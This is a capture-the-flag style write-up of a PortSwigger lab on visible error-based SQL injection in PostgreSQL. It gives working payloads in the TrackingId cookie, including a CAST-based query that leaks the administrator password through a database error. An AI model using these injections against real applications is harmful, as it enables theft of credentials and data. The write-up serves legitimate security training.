
# Visible Error-Based SQL Injection



**Platform:** PortSwigger Web Security Academy

**Difficulty:** Practitioner

**Type:** SQL Injection

**Database:** PostgreSQL

**Status:** Solved


## 🎯 Objective



Exploit the `TrackingId` cookie to leak the password of the `administrator` user through a visible SQL error.



## 🧠 Core Idea



Unlike **conditional error-based SQLi**, where:



```text

Error → TRUE

No Error → FALSE

```




here the **error message itself reveals database data**.



```text

SQL Injection

     ↓

Force a type conversion error

     ↓

Database value appears in error message

     ↓

Password leaked

```



## 1. Confirm SQL Injection



Add a quote:



```http

TrackingId=xyz'

```



An SQL error confirms that the cookie is injectable.



## 2. Test the Error-Based Technique



Use:



```sql

AND 1=CAST((SELECT 1) AS int)--

```



`CAST()` attempts to convert the selected value to an integer.



The goal is to replace `1` with a database value that cannot be converted to `int`.



## 3. Leak the Administrator Password



Use:



```http

TrackingId=x' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

```



### Why it works



```sql


SELECT password FROM users LIMIT 1

```



retrieves one password.



Then:



```sql

CAST(password AS int)

```



tries to convert that password to an integer.



Because the password is a string, PostgreSQL generates an error containing the value.



The response therefore reveals the password directly.



> **Tip:** Use a short TrackingId value such as `x` if the original cookie value causes the payload to be truncated.



## 🔑 Key Takeaways



```text

Visible Error-Based SQLi

        ↓

CAST()

        ↓

Force a conversion error

        ↓

Error message

        ↓

Database value leaked

```




### Important Difference



| Technique                    | Information obtained    |

| ---------------------------- | ----------------------- |

| Conditional Error-Based SQLi | TRUE / FALSE            |

| Visible Error-Based SQLi     | Database value directly |



**Main concept:**



> **Make the database include the secret value inside an error message.**



### References

* [PortSwigger — Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
* [PortSwigger — SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
